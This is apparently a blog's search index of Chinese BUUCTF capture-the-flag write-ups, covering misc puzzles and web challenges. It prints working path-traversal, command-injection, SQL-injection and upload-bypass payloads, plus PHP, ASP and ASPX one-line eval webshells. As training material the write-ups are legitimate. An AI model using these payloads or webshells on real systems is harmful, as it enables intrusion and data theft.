<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>buu_misc</title>
    <url>/2023/01/24/buu-misc/</url>
    <content><![CDATA[<p>  buu第一页。</p>
 <span id="more"></span>

<h1 id="大白"><a href="#大白" class="headerlink" title="大白"></a>大白</h1><p>010打开第二行6，7即高度</p>
<p>flag{He1lO_d4_ba1}</p>
<h1 id="wireshark"><a href="#wireshark" class="headerlink" title="wireshark"></a>wireshark</h1><p>题目 ：黑客通过wireshark抓到管理员登陆网站的一段流量包（管理员的密码即是答案) 注意：得到的 flag 请包上 flag{} 提交</p>
<p>根据提示直接过滤出POST包</p>
<p>http.request.method&#x3D;&#x3D;POST</p>
<p>flag{ffb7567a1d4f4abdffdb54e022f8facd}</p>
<h1 id="zip伪加密"><a href="#zip伪加密" class="headerlink" title="zip伪加密"></a>zip伪加密</h1><p>未加密：</p>
<p>文件头中的全局方式位标记为00 00</p>
<p> 目录中源文件的全局方式位标记为00 00</p>
<p>伪加密：</p>
<p>文件头中的全局方式位标记为00 00</p>
<p>目录中源文件的全局方式位标记为09 00</p>
<p>真加密：</p>
<p>文件头中的全局方式位标记为09 00</p>
<p>目录中源文件的全局方式位标记为09 00</p>
<p><a href="https://blog.csdn.net/xiaozhaidada/article/details/124538768">(6条消息) CTF——zip伪加密_xiaozhaidada的博客-CSDN博客</a></p>
<p>flag{Adm1N-B2G-kU-SZIP}</p>
<h1 id="被嗅探的流量"><a href="#被嗅探的流量" class="headerlink" title="被嗅探的流量"></a>被嗅探的流量</h1><p>某黑客潜入到某公司内网通过嗅探抓取了一段文件传输的数据，该数据也被该公司截获，你能帮该公司分析他抓取的到底是什么文件的数据吗？ 注意：得到的 flag 请包上 flag{} 提交</p>
<p><a href="https://files.buuoj.cn/files/ff965ff87437e3fda765ba928da94821/efa02e35-ee20-476f-94a2-cadbcef7d076.zip"> efa02e35-ee20-476f-94a2-cadbcef7d076.zip</a></p>
<p>解法一</p>
<p>根据提示，文件传输直接找POST的包</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http.request.method==POST</span><br></pre></td></tr></table></figure>

<p>解法二</p>
<p>查找字符<strong>flag.</strong></p>
<p>追踪流tcp流打开</p>
<p>flag{da73d88936010da1eeeb36e945ec4b97}</p>
<h1 id="qr"><a href="#qr" class="headerlink" title="qr"></a>qr</h1><p><a href="https://www.online-qr-scanner.com/zh-cn/">在线二维码扫描器 (online-qr-scanner.com)</a></p>
<p>解法二</p>
<p>微信扫一下</p>
<p>flag{878865ce73370a4ce607d21ca01b5e59}</p>
<h2 id="镜子里面的世界"><a href="#镜子里面的世界" class="headerlink" title="镜子里面的世界"></a>镜子里面的世界</h2><p>flag{st3g0_saurus_wr3cks}</p>
<h2 id="另外一个世界"><a href="#另外一个世界" class="headerlink" title="另外一个世界"></a>另外一个世界</h2><p>01101011011011110110010101101011011010100011001101110011</p>
<p> 在文件最后找到一串二进制数字，以8 位为一组，转换为10进制，再对照ASCII码表得出字符。最后以flag格式提交。flag{koekj3s}</p>
<h2 id="webshell后门"><a href="#webshell后门" class="headerlink" title="webshell后门"></a>webshell后门</h2><p>d盾查一下就出来了但是文件修改过了，但flag没改，</p>
<p>但无所谓了</p>
<p>后门查杀同上题</p>
<p>flag{6ac45fb83b3bc355c024f5034b947dd3}</p>
<p><a href="https://so.csdn.net/so/search?q=zlib&spm=1001.2101.3001.7020">zlib</a>是PNG IDAT的可选压缩格式</p>
]]></content>
      <categories>
        <category>misc</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>buu_web</title>
    <url>/2023/02/01/buu-web/</url>
    <content><![CDATA[<p>   buu第一页。</p>
 <span id="more"></span>

<h2 id="HCTF-2018-WarmUp"><a href="#HCTF-2018-WarmUp" class="headerlink" title="[HCTF 2018]WarmUp"></a>[HCTF 2018]WarmUp</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;<span class="variable">$page</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="variable">$whitelist</span> = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="comment">//判断$page是否存在于$whitelist数组中，存在则返回true</span></span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)//从<span class="number">0</span>截取到？</span><br><span class="line">            );<span class="comment">//.&#x27;?&#x27;在结尾补?</span></span><br><span class="line">            <span class="comment">//mb_strpos()mb_strpos — 查找字符串在另一个字符串中首次出现的位置</span></span><br><span class="line">              <span class="comment">//mb_substr() 函数根据 start 和 length 参数返回 str 中指定的部分</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;<span class="comment">//截取后是否存在在白名单</span></span><br><span class="line"></span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">            <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">                <span class="variable">$_page</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::<span class="title function_ invoke__">checkFile</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>]) <span class="comment">//checkFile校验</span></span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>“.&#x2F;“：代表目前所在的目录。</strong></p>
<p><strong>“ . .&#x2F;“代表上一层目录。</strong></p>
<p><strong>“&#x2F;“：代表根目录。</strong></p>
<p>注： 确保url解码后能通过白名单。浏览器会解码一次，而 ? 经过一次urlencode编码为：%3f；两次为：%253f</p>
<p>payload:<code>/source.php/?file=hint.php%253f../../../../../ffffllllaaaagggg</code></p>
<p><code> </code>flag{cda6b5c3-dab2-42fb-a21e-6e7280953804}</p>
<h2 id="ACTF2020-新生赛-Include–伪协议"><a href="#ACTF2020-新生赛-Include–伪协议" class="headerlink" title="[ACTF2020 新生赛]Include–伪协议"></a>[ACTF2020 新生赛]Include–伪协议</h2><p>伪协议</p>
<p>file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php</p>
<p>file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p>
<p>flag{bc539291-7afe-46da-9629-52bb02de6ffb}</p>
<h2 id="ACTF2020-新生赛-Exec"><a href="#ACTF2020-新生赛-Exec" class="headerlink" title="[ACTF2020 新生赛]Exec"></a>[ACTF2020 新生赛]Exec</h2><p>127.0.0.1;ls &#x2F;;</p>
<p>127.0.0.1;cat &#x2F;flag;</p>
<p>flag{b48b1925-822a-46b7-8cdc-db7b94b1604e}</p>
<h2 id="GXYCTF2019-Ping-Ping-Ping"><a href="#GXYCTF2019-Ping-Ping-Ping" class="headerlink" title="[GXYCTF2019]Ping Ping Ping"></a>[GXYCTF2019]Ping Ping Ping</h2><p>打开后&#x2F;?ip&#x3D;</p>
<p>get传参ip&#x3D;1时</p>
<p>返回</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PING 1 (0.0.0.1): 56 data bytes</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PING 2 (0.0.0.2): 56 data bytes</span><br></pre></td></tr></table></figure>

<p>猜测是一个计算机指令，ip的值为ip地址</p>
<p>?ip&#x3D;127.0.0.1;ls</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PING 127.0.0.1 (127.0.0.1): 56 data bytes</span><br><span class="line">flag.php</span><br><span class="line">index.php</span><br></pre></td></tr></table></figure>

<p>cat flag.php</p>
<p>发现空格被过滤，flag，* ？被过滤</p>
<p>?ip&#x3D;127.0.0.1;cat$IFS$1index.php ，发现源码。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?ip=</span><br><span class="line">|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span><br><span class="line">    echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span><br><span class="line">    die(&quot;fxck your symbol!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your space!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your bash!&quot;);</span><br><span class="line">  &#125; else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span><br><span class="line">    die(&quot;fxck your flag!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  $a = shell_exec(&quot;ping -c 4 &quot;.$ip);</span><br><span class="line">  echo &quot;</span><br><span class="line">&quot;;</span><br><span class="line">  print_r($a);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>绕过方法</p>
<ol>
<li>$IFS</li>
<li>${IFS}</li>
<li>$IFS$1 &#x2F;&#x2F;$1改成$加其他数字貌似都行</li>
<li>&lt; </li>
<li>&lt;&gt; </li>
<li>{cat,flag.php}  &#x2F;&#x2F;用逗号实现了空格功能</li>
<li>%20 </li>
<li>%09</li>
</ol>
<p>只能用$IFS$1</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat `ls` #查看当前目录的所有文件的内容。</span><br><span class="line"></span><br><span class="line">cat *     #查看当前目录的所有文件的内容。</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?ip=127.0.0.1;cat$IFS$9`ls`</span><br></pre></td></tr></table></figure>

<p>查看源代码</p>
<p>flag{4fe89af8-21fb-405b-81f1-bb4510e5d776}</p>
<h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><p>测试 1’ or 1&#x3D;1 # ,初步判定存在SQL注入。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 #</span></span><br></pre></td></tr></table></figure>

<p>再测试字段数，到3时报错，说明字段数为2.</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 1 # </span></span><br></pre></td></tr></table></figure>

<p>接着尝试union注入,回显了过滤的关键字。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2#</span></span><br></pre></td></tr></table></figure>

<p>堆叠注入”<br>原理，就是通过 ; 号注入多条SQL语句</p>
<p>先通过show databases爆出数据库。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;; show databases; #</span></span><br></pre></td></tr></table></figure>

<p>可以看到这里有两个表，我们先尝试爆words表的内容。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27;; show columns from words; #</span></span><br></pre></td></tr></table></figure>

<p>然后报表 1919810931114514 的内容。</p>
<p><strong>表名为数字时，要用反引号包起来查询。</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span><span class="string">&#x27;; show columns from `1919810931114514 `; #</span></span><br></pre></td></tr></table></figure>

<p>1，通过 rename 先把 words 表改名为其他的表名。</p>
<p>2，把 1919810931114514 表的名字改为 words 。</p>
<p>3 ，给新 words 表添加新的列名 id 。</p>
<p>4，将 flag 改名为 data 。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; rename table words to word1; rename table `1919810931114514` to words;alter table words add id int unsigned not Null auto_increment primary key; alter table words change flag data varchar(100);#</span><br></pre></td></tr></table></figure>

<p>[ BUUCTF[强网杯 2019]随便注 的三种解法_天问_Herbert555的博客-CSDN博客_[强网杯 2019]随便注](<a href="https://blog.csdn.net/qq_44657899/article/details/103239145?ops_request_misc=%7B%22request_id%22:%22167525557716800186572538%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167525557716800186572538&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-103239145-null-null.142%5Ev72%5Einsert_down1,201%5Ev4%5Eadd_ask&utm_term=%5B%E5%BC%BA%E7%BD%91%E6%9D%AF">https://blog.csdn.net/qq_44657899/article/details/103239145?ops_request_misc=%7B%22request%5Fid%22%3A%22167525557716800186572538%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=167525557716800186572538&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-103239145-null-null.142^v72^insert_down1,201^v4^add_ask&amp;utm_term=[强网杯</a> 2019]随便注&amp;spm&#x3D;1018.2226.3001.4187)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;; handler `1919810931114514` open as `a`; handler `a` read next;#</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;18e9f535-61ab-4cb5-8b24-03fb1b16d853&#125;</span><br></pre></td></tr></table></figure>

<h2 id="极客大挑战-2019-LoveSQL"><a href="#极客大挑战-2019-LoveSQL" class="headerlink" title="[极客大挑战 2019]LoveSQL"></a>[极客大挑战 2019]LoveSQL</h2><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; order by 4#   报错，说明是三列</span><br><span class="line">1&#x27; union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() #</span><br><span class="line">1&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;l0ve1ysq1&#x27; #</span><br><span class="line">1&#x27; union select group_concat(id),group_concat(username),group_concat(password) from l0ve1ysq1#</span><br></pre></td></tr></table></figure>



<h2 id="ACTF2020-新生赛-BackupFile"><a href="#ACTF2020-新生赛-BackupFile" class="headerlink" title="[ACTF2020 新生赛]BackupFile"></a>[ACTF2020 新生赛]BackupFile</h2><p>dirsearch去扫，扫出来太多了</p>
<p>backupfile可知找备份文件，虽然我是看wp可知，</p>
<p>&#x2F;index.php.bat</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include_once</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;key&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$key</span>)) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Just num!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$str</span> = <span class="string">&quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span> == <span class="variable">$str</span>) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Try to find out source file!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>传入key，首先判断key是否为数字或者数字字符。然后对key取整。最后判断key和str是否相等。这里存在弱比较漏洞。<br>原理：如果key为数字时，在做&#x3D;&#x3D;比较时，str<a href="https://so.csdn.net/so/search?q=%E5%AD%97%E7%AC%A6%E4%B8%B2&spm=1001.2101.3001.7020">字符串</a>自动变为数字，即str&#x3D;123。</p>
<p>flag{a3cf62f3-1704-46dc-b72b-a043c514dbdd}</p>
<h2 id="极客大挑战-2019-BabySQL"><a href="#极客大挑战-2019-BabySQL" class="headerlink" title="[极客大挑战 2019]BabySQL"></a>[极客大挑战 2019]BabySQL</h2><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a><strong>双写绕过</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; union select 1#</span><br></pre></td></tr></table></figure>

<p><img src="/2023/02/01/buu-web/QQ%E6%88%AA%E5%9B%BE20230511142254.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;ununionion seselectlect 1,2,3#</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; ununionion selselectect 1,(selselectect group_concat(table_name) frofromm infoorrmation_schema.tables whwhereere table_schema=database()),3 #</span><br><span class="line">1&#x27;ununionion selselectect 1,(selselectect group_concat(column_name) frofromm infoorrmation_schema.columns whwhereere table_name = &#x27;b4bsql&#x27;),3 #</span><br><span class="line">1&#x27;ununionion selselectect 1,(seselectlect group_concat(passwoorrd) frfromom b4bsql),3 #</span><br></pre></td></tr></table></figure>

<h2 id="极客大挑战-2019-Upload"><a href="#极客大挑战-2019-Upload" class="headerlink" title="[极客大挑战 2019]Upload"></a>[极客大挑战 2019]Upload</h2><ol>
<li>一句话木马<code>&lt;?</code>绕过</li>
<li>文件后缀绕过</li>
<li>文件类型<code>Content-Type</code>绕过</li>
</ol>
<p>文件头GIF86a    &#x2F;&#x2F;绕过前端验证</p>
<p>.phtml后缀可绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GIF89a?</span><br><span class="line">&lt;script language=&quot;php&quot;&gt;eval($_REQUEST[shell])&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>生成图片木马的系统指令</p>
<p>copy 图片&#x2F;b+一句话木马&#x2F;a 图片木马</p>
<p>这句指令只能够在cmd终端中进行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">copy pho.jpg /b + hack.php /a hack.jpg</span><br></pre></td></tr></table></figure>

<p>蚁剑连接</p>
<p>常见的一句话木马：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php的一句话木马： &lt;?php @eval($_POST[&#x27;pass&#x27;]);?&gt;</span><br><span class="line">asp的一句话是：   &lt;%eval request (&quot;pass&quot;)%&gt;</span><br><span class="line">aspx的一句话是：  &lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;</span><br></pre></td></tr></table></figure>

<p><strong>ASP 文件可包含文本、 HTML 标签和脚本。ASP 文件中的脚本可在服务器上执行。</strong></p>
<p>htaccess文件(或者”分布式配置文件”）,全称是Hypertext Access(超文本入口)。提供了针对目录改变配置的方法， 即，在一个特定的文档目录中放置一个包含一个或多个指令的文件， 以作用于此目录及其所有子目录。作为用户，所能使用的命令受到限制。管理员可以通过Apache的AllowOverride指令来设置。新建.htaccess文件，编辑内容为SetHandler application&#x2F;x-httpd-php</p>
<p>&#x2F;&#x2F;该语句作用是让Apache将其他类型文件均以php格式解析</p>
<h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><h3 id="Python的web框架-Tornado"><a href="#Python的web框架-Tornado" class="headerlink" title="Python的web框架-Tornado"></a>Python的web框架-Tornado</h3><p><a href="https://so.csdn.net/so/search?q=tornado&spm=1001.2101.3001.7020">tornado</a>.web.Application对象初始化赋予cookie_secret参数，用于保存本网站cookies加密密钥</p>
<p>&#x2F;hints.txt<br>md5(cookie_secret+md5(filename))</p>
<p>&#x2F;flag.txt<br>flag in &#x2F;fllllllllllllag</p>
<p>&#x2F;welcome.txt<br>render</p>
<p>cookie_secret的值</p>
<p>error?msg&#x3D;</p>
<p>即可查看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;autoreload&#x27;: True, &#x27;compiled_template_cache&#x27;: False, &#x27;cookie_secret&#x27;: &#x27;f6fcc9c5-389d-4b35-95c9-ceb850ba40a5&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>filename&#x3D;&#x2F;fllllllllllllag   加密后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3bf9f6cf685a6dd8defadabfb41a03a1  </span><br></pre></td></tr></table></figure>

<p>拼接md5加密后</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">6ee95f59fff4fc3fa9cb75bf353e4864</span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">file?filename=/fllllllllllllag&amp;filehash=6ee95f59fff4fc3fa9cb75bf353e4864</span><br></pre></td></tr></table></figure>



<h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;</span></span><br><span class="line"><span class="string">&lt;meta charset=\&quot;utf-8\&quot;&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="title function_ invoke__">time</span>() . (<span class="keyword">string</span>)<span class="title function_ invoke__">rand</span>(<span class="number">100</span>, <span class="number">1000</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$target_path</span>  = <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;/upload/&quot;</span> . <span class="title function_ invoke__">md5</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;user&#x27;</span>]);</span><br><span class="line">    <span class="variable">$t_path</span> = <span class="variable">$target_path</span> . <span class="string">&quot;/&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="variable">$uploaded_ext</span>  = <span class="title function_ invoke__">substr</span>(<span class="variable">$uploaded_name</span>, <span class="title function_ invoke__">strrpos</span>(<span class="variable">$uploaded_name</span>,<span class="string">&#x27;.&#x27;</span>) + <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;size&#x27;</span>];</span><br><span class="line">    <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[<span class="string">&#x27;uploaded&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/ph/i&quot;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$uploaded_ext</span>)))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;我扌your problem?&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (((<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;</span></span><br><span class="line"><span class="string">            &quot;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/jpeg&quot;</span>) || (<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/pjpeg&quot;</span>)|| (<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;type&quot;</span>] == <span class="string">&quot;image/png&quot;</span>)) &amp;&amp; (<span class="variable">$_FILES</span>[<span class="string">&quot;uploaded&quot;</span>][<span class="string">&quot;size&quot;</span>] &lt; <span class="number">2048</span>))&#123;</span><br><span class="line">            <span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$uploaded_tmp</span>);</span><br><span class="line">			<span class="title function_ invoke__">mkdir</span>(<span class="title function_ invoke__">iconv</span>(<span class="string">&quot;UTF-8&quot;</span>, <span class="string">&quot;GBK&quot;</span>, <span class="variable">$target_path</span>), <span class="number">0777</span>, <span class="literal">true</span>);</span><br><span class="line">			<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$uploaded_tmp</span>, <span class="variable">$t_path</span>);</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$t_path&#125;</span> succesfully uploaded!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;我扌your problem?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上传一个.htaccess文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ForceType application/x-httpd-php</span><br><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>

<p>同时修改类型为png</p>
<p>上传成功</p>
<p>接着上传一句话木马</p>
